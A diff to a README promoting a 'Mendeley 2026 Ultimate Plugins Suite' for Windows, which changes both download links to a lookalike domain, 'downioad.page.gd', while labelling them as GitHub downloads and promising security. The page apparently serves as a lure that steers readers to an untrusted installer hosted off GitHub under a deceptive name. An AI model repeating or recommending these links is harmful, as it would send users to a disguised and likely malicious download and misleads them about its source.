@@ -2,7 +2,7 @@
 
 Welcome to the Mendeley 2026 Ultimate Plugins Suite, the all-in-one solution for supercharging your reference management workflow on Windows. This tool integrates advanced plugins, citation generators, and collaborative features to elevate your academic and professional productivity. Designed specifically for Windows 10 and Windows 11, it offers a seamless and efficient experience for researchers, students, and professionals seeking to optimize their reference libraries and research processes.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -66,7 +66,7 @@ A: The suite is developed with security in mind, using encrypted connections for
 
 For the latest version, visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link always points to the most recent stable release, ensuring you have access to all new features, improvements, and security updates. It is recommended to check for updates periodically to keep your suite current and benefit from ongoing enhancements.
 
